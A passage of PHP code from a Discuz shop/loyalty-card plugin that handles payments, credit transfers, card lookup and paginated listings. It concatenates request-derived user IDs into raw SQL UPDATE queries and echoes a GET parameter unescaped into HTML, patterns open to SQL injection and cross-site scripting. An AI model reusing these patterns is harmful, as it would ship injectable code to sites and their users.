	echo "<ul>$str_yuangong<ul><div style='text-align:center;'>$pagepre&nbsp;&nbsp;$pagenext</div>";
}


if($_GET['ac']=="money_add"){
	if($uid>0){
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		if($_GET['idtype']=='uid'){
			$tmpuid=$_GET['it618_uid'];
		}else if($_GET['idtype']=='cardid'){
			$tmpuid = C::t('#it618_brand#it618_brand_card')->fetch_uid_by_cardid($_GET['it618_uid']);
		}else if($_GET['idtype']=='tel'){
			$tmpuid = C::t('#it618_brand#it618_brand_card')->fetch_uid_by_tel($_GET['it618_uid']);
		}
	
		if(C::t('#it618_brand#it618_brand_sale')->count_by_uid($tmpuid)>0&&$tmpuid!=''){
			if($ShopUid==$tmpuid){
				echo 'it618_split'.it618_brand_getlang('s668');exit;
			}
			$username=C::t('#it618_brand#it618_brand_sale')->fetch_username_by_uid($tmpuid);
			
			$it618_money=intval($_GET['it618_money']);
			$it618_score=intval($_GET['it618_score']);
			
			$curcredit=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$uid);
			if($it618_score>$curcredit){
				echo 'it618_split'.it618_brand_getlang('s669').$creditname.it618_brand_getlang('s670');exit;
			}
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			$id = C::t('#it618_brand#it618_brand_money')->insert(array(
				'it618_shopid' => $ShopId,
				'it618_money' => $it618_money,
				'it618_score' => $it618_score,
				'it618_uid' => $tmpuid,
				'it618_bz' => it618_brand_utftogbk($_GET['it618_bz']),
				'it618_type' => 1,
				'it618_time' => $_G['timestamp']
			), true);
			
			if($id>0){
				$tmpcount=C::t('#it618_brand#it618_brand_card')->count_by_uid_isok($tmpuid);
				if($tmpcount>0){
					$tmpcount=C::t('#it618_brand#it618_brand_cardmoney')->count_by_shopid_uid($ShopId,$tmpuid);
					if($tmpcount==0){
						C::t('#it618_brand#it618_brand_cardmoney')->insert(array(
							'it618_shopid' => $ShopId,
							'it618_uid' => $tmpuid,
							'it618_count2' => 1,
							'it618_money2' => $it618_money,
						), true);
					}else{
						DB::query("update ".DB::table('it618_brand_cardmoney')." set it618_count2=it618_count2+1,it618_money2=it618_money2+".$it618_money." where it618_shopid=".$ShopId." and it618_uid=".$tmpuid);
					}
				}
				if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
				C::t('common_member_count')->increase($tmpuid, array(
					'extcredits'.$it618_brand['brand_credit'] => $it618_score)
				);
				C::t('common_member_count')->increase($ShopUid, array(
					'extcredits'.$it618_brand['brand_credit'] => (0-$it618_score))
				);
			}
		}else{
			if($_GET['idtype']=='uid'){
				echo 'it618_split'.it618_brand_getlang('s662');exit;
			}else if($_GET['idtype']=='cardid'){
				echo 'it618_split'.it618_brand_getlang('s663');exit;
			}else if($_GET['idtype']=='tel'){
				echo 'it618_split'.it618_brand_getlang('s664');exit;
			}
			
		}
		
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$curcredit=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$uid);
		echo "okit618_split".it618_brand_getlang('s665')."it618_split$curcredit";
	}
}


if($_GET['ac']=="checkuser"){
	if($uid>0){
		$count=C::t('#it618_brand#it618_brand_yuangong')->count_by_uid_shopid('it618_isxxsale',$uid,$ShopId);
		if($count==0){
			echo $it618_brand_lang['s1699'];
		}else{
			if($_GET['findtype']==1){
				$count=C::t('#it618_brand#it618_brand_card')->count_by_uid_isok($_GET['saleuserid']);
				if($count==0){
					$flag=1;
				}else{
					$userid=$_GET['saleuserid'];
				}
			}
			if($_GET['findtype']==2){
				$count=C::t('#it618_brand#it618_brand_card')->count_by_cardid_isok($_GET['saleuserid']);
				if($count==0){
					$flag=1;
				}else{
					$userid=C::t('#it618_brand#it618_brand_card')->fetch_uid_by_cardid($_GET['saleuserid']);
				}
			}
			if($_GET['findtype']==3){
				$count=C::t('#it618_brand#it618_brand_card')->count_by_tel_isok($_GET['saleuserid']);
				if($count==0){
					$flag=1;
				}else{
					$userid=C::t('#it618_brand#it618_brand_card')->fetch_uid_by_tel($_GET['saleuserid']);
				}
			}
			
			if($flag==1){
				echo $it618_brand_lang['s1700'];
			}else{
				$it618_brand_card=C::t('#it618_brand#it618_brand_card')->fetch_by_uid($userid);
				$username=C::t('#it618_brand#it618_brand_sale')->fetch_username_by_uid($userid);
				if($it618_brand_card['it618_name']==''){
					echo 'okit618_split'.$it618_brand_lang['s1701'].$username.$it618_brand_lang['s1702'];
				}else{
					echo 'okit618_split'.$it618_brand_lang['s1703'].$it618_brand_card['it618_name'].$it618_brand_lang['s1704'].$username.$it618_brand_lang['s1702'];
				}
			}
		}
	}
}


if($_GET['ac']=="addmoney"){
	if($uid>0){
		$count=C::t('#it618_brand#it618_brand_yuangong')->count_by_uid_shopid('it618_isxxsale',$uid,$ShopId);
		if($count==0){
			echo $it618_brand_lang['s1699'];
		}else{
			if($_GET['findtype']==1){
				$count=C::t('#it618_brand#it618_brand_card')->count_by_uid_isok($_GET['saleuserid']);
				if($count==0){
					$flag=1;
				}else{
					$userid=$_GET['saleuserid'];
				}
			}
			if($_GET['findtype']==2){
				$count=C::t('#it618_brand#it618_brand_card')->count_by_cardid_isok($_GET['saleuserid']);
				if($count==0){
					$flag=1;
				}else{
					$userid=C::t('#it618_brand#it618_brand_card')->fetch_uid_by_cardid($_GET['saleuserid']);
				}
			}
			if($_GET['findtype']==3){
				$count=C::t('#it618_brand#it618_brand_card')->count_by_tel_isok($_GET['saleuserid']);
				if($count==0){
					$flag=1;
				}else{
					$userid=C::t('#it618_brand#it618_brand_card')->fetch_uid_by_tel($_GET['saleuserid']);
				}
			}
			
			if($flag==1){
				echo $it618_brand_lang['s1700'];
			}else{
				$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($ShopId);
				$salebl=$it618_brand_brand['it618_salebl']/100;
				if($_GET['salebl']!=$salebl){
					echo 'reloadit618_split'.$it618_brand_lang['s1705'];exit;
				}
				$it618_score=intval($_GET['salemoney']*$salebl);
				$it618_money=floatval($_GET['salemoney']);
				
				$curcredit=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$ShopUid);
				if($it618_score>$curcredit){
					echo 'it618_split'.it618_brand_getlang('s669').$creditname.it618_brand_getlang('s670');exit;
				}
				if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
				$id = C::t('#it618_brand#it618_brand_money')->insert(array(
					'it618_shopid' => $ShopId,
					'it618_money' => $it618_money,
					'it618_score' => $it618_score,
					'it618_saleuid' => $uid,
					'it618_uid' => $userid,
					'it618_type' => 1,
					'it618_time' => $_G['timestamp']
				), true);
				
				if($id>0){
					$tmpcount=C::t('#it618_brand#it618_brand_card')->count_by_uid_isok($userid);
					if($tmpcount>0){
						$tmpcount=C::t('#it618_brand#it618_brand_cardmoney')->count_by_shopid_uid($ShopId,$userid);
						if($tmpcount==0){
							C::t('#it618_brand#it618_brand_cardmoney')->insert(array(
								'it618_shopid' => $ShopId,
								'it618_uid' => $userid,
								'it618_count2' => 1,
								'it618_money2' => $it618_money,
							), true);
						}else{
							DB::query("update ".DB::table('it618_brand_cardmoney')." set it618_count2=it618_count2+1,it618_money2=it618_money2+".$it618_money." where it618_shopid=".$ShopId." and it618_uid=".$userid);
						}
					}
					if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
					C::t('common_member_count')->increase($userid, array(
						'extcredits'.$it618_brand['brand_credit'] => $it618_score)
					);
					C::t('common_member_count')->increase($ShopUid, array(
						'extcredits'.$it618_brand['brand_credit'] => (0-$it618_score))
					);
					
					it618_brand_yuangongsale($ShopId,$uid,2,$id,$it618_brand_lang['s1779'],$_G['timestamp']);
					echo 'ok';
				}
			}
		}
	}
}


if($_GET['ac']=="bdcard"){
	if($uid>0){
		if($Shop_iscard==0){
			echo $it618_brand_lang['s1699'];
		}else{
			$count=C::t('#it618_brand#it618_brand_card')->count_by_cardid($_GET['cardid']);
			if($count==0){
				echo 'cardidit618_split'.$it618_brand_lang['s1709'];exit;
			}
			
			$count=C::t('#it618_brand#it618_brand_card')->count_by_tel($_GET['cardtel']);
			if($count>0){
				echo 'cardtelit618_split'.$it618_brand_lang['s1710'];exit;
			}
			
			$count=C::t('#it618_brand#it618_brand_card')->count_by_cardid_tel($_GET['cardid'],$_GET['cardtel']);
			if($count>0){
				echo 'cardit618_split'.$it618_brand_lang['s1711'];exit;
			}
			
			$id=C::t('#it618_brand#it618_brand_card')->fetch_id_by_cardid($_GET['cardid']);
			
			C::t('#it618_brand#it618_brand_card')->update($id,array(
				'it618_name' => it618_brand_utftogbk($_GET['cardname']),
				'it618_tel' => it618_brand_utftogbk($_GET['cardtel'])
			), true);
			
			$carduid=C::t('#it618_brand#it618_brand_card')->fetch_uid_by_cardid($_GET['cardid']);
			C::t('#it618_brand#it618_brand_card')->update_usertb(it618_brand_utftogbk($_GET['cardtel']),$carduid);
			
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			echo 'okit618_split'.it618_brand_getlang('s1708');

		}
	}
}



if($_GET['ac']=="findcard"){
	if($uid>0){
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		if($_GET['idtype']=='uid'){
			$tmpuid=$_GET['it618_uid'];
			if(!$it618_brand_card=C::t('#it618_brand#it618_brand_card')->fetch_by_uid($tmpuid)){
				echo '<font color=red>'.$it618_brand_lang['s1501'].'</font>';exit;
			}else{
				if($it618_brand_card['it618_state']==0){
					echo '<font color=red>'.$it618_brand_lang['s1502'].'</font>';exit;
				}
			}
		}else if($_GET['idtype']=='cardid'){
			$tmpuid = C::t('#it618_brand#it618_brand_card')->fetch_uid_by_cardid($_GET['it618_uid']);
			if($tmpuid==''){
				echo '<font color=red>'.$it618_brand_lang['s1503'].'</font>';exit;
			}
		}else if($_GET['idtype']=='tel'){
			$tmpuid = C::t('#it618_brand#it618_brand_card')->fetch_uid_by_tel($_GET['it618_uid']);
			if($tmpuid==''){
				echo '<font color=red>'.$it618_brand_lang['s1504'].'</font>';exit;
			}
		}
		
		$count = C::t('#it618_brand#it618_brand_cardmoney')->count_by_search($ShopId,$tmpuid);
		if($count==0){
			echo '<font color=red>'.$it618_brand_lang['s1505'].'</font>';exit;
		}


		$it618_brand_cardmoney=C::t('#it618_brand#it618_brand_cardmoney')->fetch_by_shopid_uid($ShopId,$tmpuid);
		$it618_brand_card=C::t('#it618_brand#it618_brand_card')->fetch_by_uid($it618_brand_cardmoney['it618_uid']);
		
		$username=C::t('#it618_brand#it618_brand_sale')->fetch_username_by_uid($it618_brand_card['it618_uid']);
		$creditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$it618_brand_card['it618_uid']);
		if($creditnum=="")$creditnum=0;
		
		$moneycount=C::t('#it618_brand#it618_brand_money')->count_by_shopid(0,0,0,0,$it618_brand_card['it618_uid']);
		$it618_brand_level=C::t('#it618_brand#it618_brand_level')->fetch_by_type_salecount(1,$moneycount);
		$tmplevelarr=explode(",",$it618_brand['brand_level']);
		
		$allmoney=$it618_brand_cardmoney['it618_money1']+$it618_brand_cardmoney['it618_money2'];
		$fetch_by_money=C::t('#it618_brand#it618_brand_viplevel')->fetch_by_money($it618_brand_cardmoney['it618_shopid'],$allmoney);
		$viplevel=$fetch_by_money['it618_level'];
		if($viplevel==''){
			$viplevel='<font color=blue>'.it618_brand_getlang('s1423').'</font>';
			$zk='';
		}else{
			$viplevel='<font color=red>VIP'.$viplevel.'</font>';
			$zk='<font color=#f60>'.$fetch_by_money['it618_zk'].'%</font>';
		}
		
		echo '<table width="100%" class="findcardtable">
				<tr><td width=130 align="right">'.it618_brand_getlang('s1411').': </td><td><a href="home.php?mod=space&uid='.$it618_brand_card['it618_uid'].'" target="_blank">'.$username.'(<b>'.$it618_brand_card['it618_uid'].'</b>)</td></tr>
				<tr><td align="right">'.it618_brand_getlang('s1412').': </td><td>'.$it618_brand_card['it618_cardid'].'</td></tr>
				<tr><td align="right">'.it618_brand_getlang('s1413').': </td><td>'.$it618_brand_card['it618_tel'].'</td></tr>
				<tr><td align="right">'.it618_brand_getlang('s1419').': </td><td><a href="'.$it618_brand['brand_levelurl'].'" target="_blank" title="'.$it618_brand_level['it618_name'].' '.$it618_brand['brand_leveltitle'].'"><img style="vertical-align:middle;margin-top:-3px" src="'.$it618_brand_level['it618_img'].'"></a></td></tr>
				<tr><td align="right">'.it618_brand_getlang('s1420').': </td><td>'.$creditnum.'</td></tr>
				<tr><td align="right">'.it618_brand_getlang('s1414').': </td><td>'.$it618_brand_cardmoney['it618_count1'].'/'.$it618_brand_cardmoney['it618_money1'].'</td></tr>
				<tr><td align="right">'.it618_brand_getlang('s1415').': </td><td>'.$it618_brand_cardmoney['it618_count2'].'/'.$it618_brand_cardmoney['it618_money2'].'</td></tr>
				<tr><td align="right">'.it618_brand_getlang('s1416').': </td><td><font color=red>'.$allmoney.'</font></td></tr>
				<tr><td align="right">'.it618_brand_getlang('s1417').': </td><td>'.$viplevel.'</td></tr>
				<tr><td align="right">'.it618_brand_getlang('s1428').': </td><td>'.$zk.'</td></tr>
			  </table>';
	}
}


if($_GET['ac']=="mycardmoney_get"){
	$ppp = 15;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;

	$count = C::t('#it618_brand#it618_brand_cardmoney')->count_by_search(0,$uid);

	foreach(C::t('#it618_brand#it618_brand_cardmoney')->fetch_all_by_search(0,$uid, $startlimit,$ppp) as $it618_brand_cardmoney)    {

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;
		$shopname=C::t('#it618_brand#it618_brand_brand')->fetch_name_by_id($it618_brand_cardmoney['it618_shopid']);
		
		$allmoney=$it618_brand_cardmoney['it618_money1']+$it618_brand_cardmoney['it618_money2'];
		$fetch_by_money=C::t('#it618_brand#it618_brand_viplevel')->fetch_by_money($it618_brand_cardmoney['it618_shopid'],$allmoney);
		$viplevel=$fetch_by_money['it618_level'];
		if($viplevel==''){
			$viplevel='<font color=blue>'.it618_brand_getlang('s1423').'</font>';
			$zk='';
		}else{
			$viplevel='<font color=red>VIP'.$viplevel.'</font>';
			$zk='<font color=#f60>'.$fetch_by_money['it618_zk'].'%</font>';
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$aboutstr='';
		foreach(C::t('#it618_brand#it618_brand_viplevel')->fetch_all_by_shopid($it618_brand_cardmoney['it618_shopid']) as $it618_brand_viplevel) {
			$aboutstr.="VIP".$it618_brand_viplevel['it618_level']." ".it618_brand_getlang('s1425').$it618_brand_viplevel['it618_money1'].it618_brand_getlang('s1424').$it618_brand_viplevel['it618_money2'].it618_brand_getlang('s1426').$it618_brand_viplevel['it618_zk']."%\n";
		}
		
		if($_GET['wap']==0){
			$tmpurl=it618_brand_getrewrite('shop_home',$it618_brand_cardmoney['it618_shopid'],'plugin.php?id=it618_brand:shop&sid='.$it618_brand_cardmoney['it618_shopid']);
			$mycardmoney_get.='<tr class="hover">
						<td><a href="'.$tmpurl.'" target="_blank">'.$shopname.'</a></td>
						<td>'.$it618_brand_cardmoney['it618_count1'].'/'.$it618_brand_cardmoney['it618_money1'].' '.it618_brand_getlang('s389').'</td>
						<td>'.$it618_brand_cardmoney['it618_count2'].'/'.$it618_brand_cardmoney['it618_money2'].' '.it618_brand_getlang('s389').'</td>
						<td><font color=red>'.$allmoney.' '.it618_brand_getlang('s389').'</font></td>
						<td>'.$viplevel.'</td>
						<td>'.$zk.'</td>
						<td><a href="javascript:" title="'.$aboutstr.'" onclick="alert(this.title)">'.it618_brand_getlang('s1427').'</a></td>
						</tr>';
						
		}else{
			$tmpurl=it618_brand_getrewrite('brand_wap','shop@'.$it618_brand_cardmoney['it618_shopid'],'plugin.php?id=it618_brand:wap&pagetype=shop&sid='.$it618_brand_cardmoney['it618_shopid']);
			$mycardmoney_get.='<tr class="hover">
						<td><a href="'.$tmpurl.'" target="_blank">'.$shopname.'</a></td>
						<td align="center"><font color=red>'.$allmoney.'</font></td>
						<td align="center">'.$viplevel.'</td>
						<td align="center">'.$zk.'</td>
						<td align="center"><a href="javascript:" title="'.$aboutstr.'" onclick="alert(this.title)">'.it618_brand_getlang('s1427').'</a></td>
						</tr>';
		}
		
	}
	
	if($multipage!='')$multipage='<tr><td colspan=4><div class="cuspages right">'.$multipage.'</div></td></tr>';
	$creditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$ShopUid);
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($_GET['wap']==0){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getmycradlist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getmycradlist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getmycradlist(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
		
	}else{
		$mycardmoney_get='<table width="100%" style="font-size:12px;margin-top:10px;margin-bottom:10px" id="moneylist"><tr><th style="padding-bottom:6px">'.it618_brand_getlang('t617').'</th><th>'.it618_brand_getlang('s1416').'</th><th>'.it618_brand_getlang('t620').'</th><th>'.it618_brand_getlang('t621').'</th><th>'.it618_brand_getlang('t635').'</th></tr>'.$mycardmoney_get.'</table>';
		
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$funname='getmycradlist';
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}

	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	$fetch_sum_by_uid=C::t('#it618_brand#it618_brand_cardmoney')->fetch_sum_by_uid($uid);
	echo it618_brand_getlang('s1429').'<font color=red>'.$fetch_sum_by_uid['c1'].'/'.$fetch_sum_by_uid['m1'].'</font> '.it618_brand_getlang('s1430').'<font color=red>'.$fetch_sum_by_uid['c2'].'/'.$fetch_sum_by_uid['m2'].'</font>it618_split'.$mycardmoney_get.'it618_split'.$multipage;
}


if($_GET['ac']=="money_get"){
	$saleuid=0;
	if(isset($_GET['type'])){
		$count=C::t('#it618_brand#it618_brand_yuangong')->count_by_uid_shopid('it618_isxxsale',$uid,$ShopId);
		if($count==0){
			echo $it618_brand_lang['s1699'];exit;
		}
		$saleuid=$uid;
		$salecss='none';
	}else{
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($ShopId);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($_GET['wap']==0){
		$ppp = $Shop_systemcount;
		$th='<tr class="header"><th>'.it618_brand_getlang('s509').'</th><th>'.it618_brand_getlang('s1393').'</th><th>'.it618_brand_getlang('s1394').'</th><th>'.it618_brand_getlang('s508').'</th><th>'.it618_brand_getlang('s206').'</th><th><div style="width:300px">'.it618_brand_getlang('s510').'</div></th><th>'.it618_brand_getlang('s1698').'</th><th>'.it618_brand_getlang('s511').'</th></tr>';
	}else{
		$ppp = 15;
		$th='<tr><th style="padding-bottom:6px">'.it618_brand_getlang('s509').'</th><th>'.it618_brand_getlang('s508').'</th><th>'.it618_brand_getlang('s206').'</th><th style="display:'.$salecss.'">'.it618_brand_getlang('s1698').'</th><th>'.it618_brand_getlang('s511').'</th></tr>';
	}
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	if($_GET['idtypefind']=='uid'){
		$it618_uid_find=$_GET['it618_uid_find'];
		$selected1='selected="selected"';
	}else if($_GET['idtypefind']=='cardid'){
		$it618_uid_findtmp = C::t('#it618_brand#it618_brand_card')->fetch_uid_by_cardid($_GET['it618_uid_find']);
		if($it618_uid_findtmp=='')$it618_uid_find=0-1;
		if($_GET['it618_uid_find']=='')$it618_uid_find=0;
		$selected2='selected="selected"';
	}else if($_GET['idtypefind']=='tel'){
		$it618_uid_findtmp = C::t('#it618_brand#it618_brand_card')->fetch_uid_by_tel($_GET['it618_uid_find']);
		if($it618_uid_findtmp=='')$it618_uid_find=0-1;
		if($_GET['it618_uid_find']=='')$it618_uid_find=0;
		$selected3='selected="selected"';
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	$count = C::t('#it618_brand#it618_brand_money')->count_by_shopid($ShopId, 0, 1, 0, $it618_uid_find, $saleuid, $_GET['it618_time1'], $_GET['it618_time2']);
	$summoney = C::t('#it618_brand#it618_brand_money')->sum_by_shopid($ShopId, 0, 1, 0, $it618_uid_find, $saleuid, $_GET['it618_time1'], $_GET['it618_time2']);
	$sumscore = C::t('#it618_brand#it618_brand_money')->sum_it618_score_by_shopid($ShopId, 0, 1, 0, $it618_uid_find, $saleuid, $_GET['it618_time1'], $_GET['it618_time2']);

	foreach(C::t('#it618_brand#it618_brand_money')->fetch_all_by_shopid($ShopId,0,1,0,$it618_uid_find, $saleuid, $_GET['it618_time1'], $_GET['it618_time2'], $startlimit,$ppp) as $it618_brand_money)    {

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;
		$username=it618_brand_getusername($it618_brand_money['it618_uid']);
		$it618_brand_card=C::t('#it618_brand#it618_brand_card')->fetch_by_uid($it618_brand_money['it618_uid']);
		
		if($it618_brand_money['it618_saleuid']>0){
			$salename=C::t('#it618_brand#it618_brand_yuangong')->fetch_name_by_uid_shopid($it618_brand_money['it618_saleuid'],$ShopId);
		}else{
			$salename='';	
		}
		
		if($_GET['wap']==0){
			$money_get.='<tr class="hover"><td><a href="'.it618_brand_rewriteurl($it618_brand_money['it618_uid']).'" target="_blank" title="'.it618_brand_getlang('s408').$username.it618_brand_getlang('s409').'" class="a1">'.$username.'('.$it618_brand_money['it618_uid'].')</a> '.$it618_brand_card['it618_name'].'</td><td>'.$it618_brand_card['it618_cardid'].'</td><td>'.$it618_brand_card['it618_tel'].'</td><td><font color="red">'.$it618_brand_money['it618_money'].'</font> '.it618_brand_getlang('s389').'</td><td><font color="red">'.$it618_brand_money['it618_score'].'</font> '.$creditname.'</td><td>'.$it618_brand_money['it618_bz'].'</td><td align="center">'.$salename.'</td><td>'.date('Y-m-d H:i:s', $it618_brand_money['it618_time']).'</td></tr>';
		}else{
			$money_get.='<tr class="hover"><td><a href="'.it618_brand_rewriteurl($it618_brand_money['it618_uid']).'" target="_blank">'.$username.'('.$it618_brand_money['it618_uid'].')</a> '.$it618_brand_card['it618_name'].'</td><td align="center"><font color="red">'.$it618_brand_money['it618_money'].'</font> '.it618_brand_getlang('s389').'</td><td align="center"><font color="green">'.$it618_brand_money['it618_score'].'</font> '.$creditname.'</td><td align="center" style="display:'.$salecss.'">'.$salename.'</td><td align="center"><font color=#999>'.date('Y-m-d', $it618_brand_money['it618_time']).'</font></td></tr>';
		}
		
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($_GET['wap']==0){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getmonneyaddlist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getmonneyaddlist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getmonneyaddlist(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
		
		if($multipage!='')$multipage='<tr><td colspan=8><div class="cuspages right">'.$multipage.'</div></td></tr>';
		
		$creditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$ShopUid);
		echo $creditnum.'it618_split<tr><td colspan=8>'.it618_brand_getlang('s661').' <select id=idtypefind><option value="uid" '.$selected1.'>'.it618_brand_getlang('s1396').'</option><option value="cardid" '.$selected2.'>'.it618_brand_getlang('s1393').'</option><option value="tel" '.$selected3.'>'.it618_brand_getlang('s1394').'</option></select> <input id="it618_uid_find" value="'.$_GET['it618_uid_find'].'" class="txt" style="width:150px"/> '.it618_brand_getlang('s513').' <input id="it618_time1" value="'.$_GET['it618_time1'].'" class="txt" style="width:90px;margin-right:0" onclick="SetDate(this,\'yyyy-MM-dd\')" readonly="readonly" />-<input id="it618_time2" value="'.$_GET['it618_time2'].'" class="txt" style="width:90px" onclick="SetDate(this,\'yyyy-MM-dd\')" readonly="readonly"/><input type="submit" class="btn" onclick="findmoney()" value="'.it618_brand_getlang('s34').'" /><span style="float:right">'.it618_brand_getlang('s1172').'<font color="red">'.$count.'</font> '.it618_brand_getlang('s1173').'<font color="red">'.$summoney.'</font> '.it618_brand_getlang('s389').' '.it618_brand_getlang('s1174').'<font color="red">'.$sumscore.'</font> '.$creditname.'</span></td></tr>'.$th.$money_get.$multipage;
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		$funname='getmysalelist1';
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
